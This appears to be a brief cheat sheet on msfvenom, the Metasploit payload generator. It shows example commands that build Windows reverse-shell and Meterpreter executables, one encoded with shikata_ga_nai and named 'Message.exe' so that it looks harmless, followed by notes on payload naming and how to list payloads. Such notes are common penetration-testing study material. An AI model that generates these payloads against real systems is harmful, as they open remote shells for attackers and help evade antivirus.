  
msfvenom -p payload options

Examples:
 
`msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=ip LPORT=port`

	
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -f exe -o Message.exe`
	
	
---
	
    **PAYLOAD NAMING CONVENTIONS**  
  
OS / architecture / payload
  
_ex: linux/x86/shell\_reverse\_tcp_  
  
  
Windows 32 arch is not specified  
/windows/shell_reverse_tcp
  
64 bit windows is specified as x64  
_indows/x64/shell_reverse_tcp_ 
  
  
\* Stageless payloads are denoted with \_  
\*\*Staged payloads are denoted with /  
  
  
**PAYLOAD SEARCH**  
msfvenom --list payloads